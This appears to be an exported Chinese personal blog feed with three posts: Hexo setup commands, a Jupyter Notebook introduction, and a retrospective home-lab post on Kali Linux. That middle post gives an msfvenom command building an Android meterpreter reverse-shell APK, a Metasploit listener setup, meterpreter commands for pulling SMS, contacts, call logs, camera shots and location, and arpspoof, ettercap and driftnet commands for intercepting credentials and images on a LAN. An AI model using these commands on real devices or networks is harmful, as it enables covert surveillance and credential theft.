<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">npm install hexo-cli -g</span><br><span class="line">ln -s /home/xuchunlei/Desktop/linkstart/ftp/node-v12.15.0-linux-x64/bin/hexo /usr/local/bin/hexo</span><br></pre></td></tr></table></figure>

<p>新建hexo项目linuxtest，并启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init linuxtest</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>效果图（ip地址变了，手动设定一直有问题）<br><img src="/img/20200207/10.jpg" alt></p>
<h4 id="其他写过的Linux文章"><a href="#其他写过的Linux文章" class="headerlink" title="其他写过的Linux文章"></a>其他写过的Linux文章</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjgwNTI0Mg==&mid=2247483775&idx=1&sn=7e8630622980da1d623a1a0ede5c60f4&scene=19#wechat_redirect" target="_blank" rel="noopener">纸上得来终觉浅–Linux从复习到放弃</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjgwNTI0Mg==&mid=2247483897&idx=1&sn=95c472e3aa84fe02c2821dd31494549d&scene=19#wechat_redirect" target="_blank" rel="noopener">某码农的代码碎片3 10、Linux删除bin目录修复</a></p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>那些年-Kali局域网msfvenom木马侵入和ARP欺骗与监听</title>
    <url>/2025/04/28/%E9%82%A3%E4%BA%9B%E5%B9%B4-Kali%E5%B1%80%E5%9F%9F%E7%BD%91msfvenom%E6%9C%A8%E9%A9%AC%E4%BE%B5%E5%85%A5%E5%92%8CARP%E6%AC%BA%E9%AA%97%E4%B8%8E%E7%9B%91%E5%90%AC/</url>
    <content><![CDATA[<p><em>kali学得好，牢饭吃到饱。<br>因为硬盘空间不多了，就想着把些没用的文件清理掉，就看到了KaliLinux的虚拟机有11G。几年前(20200629)学习过一点点，还能找到当时的记录，只能算自娱自乐，实施是不可能实施的。简单整理下当时的记录，也有些懵懂了，看情况把KaliLinux虚拟机干掉，毕竟很老了</em></p>
<p><img src="/img/20250428/0.png" alt></p>
<h3 id="必须开启root和密码-大概"><a href="#必须开启root和密码-大概" class="headerlink" title="必须开启root和密码 大概"></a>必须开启root和密码 大概</h3><p><img src="/img/20250428/1.png" alt></p>
<h3 id="msfvenom木马侵入"><a href="#msfvenom木马侵入" class="headerlink" title="msfvenom木马侵入"></a>msfvenom木马侵入</h3><p>fping探查局域网接入设备IP<br><img src="/img/20250428/2.png" alt></p>
<p>nmap扫描⽬标主机系统<br><img src="/img/20250428/3.png" alt></p>
<p>生成木马 手机用 （-p载荷，LHOST本机IP，LPORT反向连接到主机的端口，R &gt;保存路径名字）<br>也能生成电脑用的exe文件<br><code>sfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.88.233 LPORT=5555 R &gt; /root/shell.apk</code><br><img src="/img/20250428/4.png" alt></p>
<p>植入基本没戏，也就在自己手机上弄弄。安装会报毒，权限没给的话好多又用不了。<br><img src="/img/20250428/5.jpg" alt><br><img src="/img/20250428/6.jpg" alt></p>
<p>植入成功的话，启动metasploit开始监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fmsfconsole</span><br><span class="line">use exploit/multi/handler #设置模块</span><br><span class="line">set payload android/meterpreter/reverse_tcp #设置载荷</span><br><span class="line">set lhost 192.168.88.233 #设置本机IP</span><br><span class="line">set lport 5555 #设置端口</span><br><span class="line">exploit #执行攻击</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250428/7.png" alt></p>
<p>获取系统信息，摄像头拍照，通讯记录<br><img src="/img/20250428/8.png" alt></p>
<p>一些命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? 查看更多命令</span><br><span class="line">cd --&gt;目录切换，命令：cd / 切换到根目录</span><br><span class="line">search --&gt;搜索文件，命令：search text.jpg</span><br><span class="line">download --&gt;下载文件，命令：download test.jpg</span><br><span class="line">webcam_list --&gt;查看摄像头列表，因为手机都是前置和后置摄像头了</span><br><span class="line">webcam_snap --&gt;拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1</span><br><span class="line">webcam_stream --&gt;开启摄像头视频监控，同上，命令：webcam_stream -i 1</span><br><span class="line">安卓系统相关命令：</span><br><span class="line">check_root --&gt;查看当前安卓是否已经root</span><br><span class="line">dump_calllog --&gt;下载通话记录</span><br><span class="line">dump_contacts --&gt;下载通讯录</span><br><span class="line">dump_sms --&gt;下载短信记录</span><br><span class="line">geolocate --&gt;利用谷歌地图定位（需要安装谷歌地图）</span><br></pre></td></tr></table></figure>

<h3 id="ARP欺骗与监听"><a href="#ARP欺骗与监听" class="headerlink" title="ARP欺骗与监听"></a>ARP欺骗与监听</h3><p>#检查自己的网卡信息和网关<br><img src="/img/20250428/9.png" alt></p>
<p>ARP欺骗 （-i 网卡名 -t 目标主机 网关(主机和网关可交换或者-r双向攻击)）<br><code>arpspoof -i eth0 -t 192.168.88.77 192.168.88.1</code><br>arpspoof 是 dsniff 的一个附属工具，安装dsniff即可<br><code>apt-get install dsniff</code><br><img src="/img/20250428/10.png" alt></p>
<p>之前阿里企业邮箱网址http还是不带s的<br><img src="/img/20250428/11.png" alt></p>
<p>开启端口转发（0流量截断，断网 1流量转发）<br><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code>（临时，每次重启终端其内容会自动变为0。永久，需要修改/etc/sysctl.conf文件，net.ipv4.ip_forward = 1）<br>使用ettercap抓取HTTP提交的账号密码（-T文本模式运行 -q安静模式 -i网卡）<br><code>ettercap -Tq -i eth0</code><br>可以轻松获取输入的用户名和密码信息<br><img src="/img/20250428/12.png" alt></p>
<p>ARP欺骗（这里网关为目标，不然还是不能联网）<br><code>arpspoof -i eth0 -t 192.168.88.1 192.168.88.77</code></p>
<p><code>apt-get install driftnet</code><br>使用Driftnet从网络流量捕获图像（-i网卡 -d保存路径 -a后台运行）<br><code>driftnet -i eth0 -d /home/xuchl/arpImg -a</code><br>可以看到微信传输的一些图片，或者使用Wireshark来对其他包进行抓取<br><img src="/img/20250428/13.png" alt></p>
<p>基本只是复制粘贴以前记录的文本和图片，实际参考意义不大，记录用。</p>
]]></content>
      <tags>
        <tag>KaliLinux</tag>
        <tag>黑客</tag>
      </tags>
  </entry>
  <entry>
    <title>初识Jupyter Notebook</title>
    <url>/2025/05/20/%E5%88%9D%E8%AF%86Jupyter%20Notebook/</url>
    <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下</em></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter Notebook</a>一个开源的Web应用程序，便于创建和共享程序文档。支持实时代码，数学方程，图表，图像，Markdown等内容的文档。可以交互地编写代码，执行代码并查看结果，支持多人实时编辑和协作，支持多种编程语言，包括Python、R、Julia等。用于数据分析，机器学习，人工智能等等。</p>
<h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>需要先安装Python<br>第一种是原生Python安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#升级pip版本</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">#安装</span><br><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure>

<p>不过，pip或者pip3安装都报错，貌似缺少Rust工具链（Rustup），需要先装。<br><img src="/img/20250520/1.jpg" alt></p>
<p>另一种是通过Anaconda</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install jupyter notebook</span><br></pre></td></tr></table></figure>

<p><img src="/img/20250520/2.png" alt></p>
<p>运行Jupyter Notebook，从命令行中启动，需要一直开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#默认端口8888启动并打开浏览器</span><br><span class="line">jupyter notebook</span><br><span class="line">#指定端口启动</span><br><span class="line">jupyter notebook --port &lt;port_number&gt;</span><br><span class="line">#启动服务器但不打开浏览器</span><br><span class="line">jupyter notebook --no-browser</span><br><span class="line">#启动时打开指定文档</span><br><span class="line">jupyter notebook notebook.ipynb</span><br></pre></td></tr></table></figure>

<p>默认启动界面<br><img src="/img/20250520/3.png" alt></p>
<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#所有配置目录</span><br><span class="line">jupyter --paths</span><br><span class="line">#配置目录</span><br><span class="line">jupyter --config-dir</span><br><span class="line">#数据目录</span><br><span class="line">jupyter --data-dir</span><br><span class="line">#运行时目录</span><br><span class="line">jupyter --runtime-dir</span><br></pre></td></tr></table></figure>

<h3 id="基本操做"><a href="#基本操做" class="headerlink" title="基本操做"></a>基本操做</h3><p><img src="/img/20250520/7.png" alt><br>工具栏<br>保存，插入单元格，剪切单元格，复制单元格，粘贴单元格(到下方)，运行单元格，重置内核，充值内核并运行所有单元格，选择单元格类型（代码，Markdown等）<br>单元格工具栏<br>复制单元格并插入到下方，上移单元格，下移单元格，在前面插入单元格，在后面插入单元格，删除单元格</p>
<p>新建文档，扩展名ipynb<br><img src="/img/20250520/4.png" alt><br>内核选择Python3<br><img src="/img/20250520/5.png" alt><br>文档效果展示，单元格支持Markdown语法和代码执行<br><img src="/img/20250520/6.png" alt></p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>Jupyter</tag>
      </tags>
  </entry>
</search>
